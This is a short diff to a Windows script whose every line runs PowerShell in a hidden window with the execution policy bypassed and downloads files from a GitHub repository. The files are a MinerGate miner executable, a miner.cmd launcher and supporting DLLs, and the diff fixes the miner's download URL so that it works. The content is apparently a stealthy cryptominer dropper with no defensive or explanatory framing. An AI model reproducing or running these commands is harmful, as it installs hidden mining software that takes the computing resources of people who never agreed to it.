@@ -1,4 +1,4 @@
-powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/master/multi/minergate-cli.exe
+powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/multi/minergate-cli.exe
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
 powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/nvrtc64_92.dll
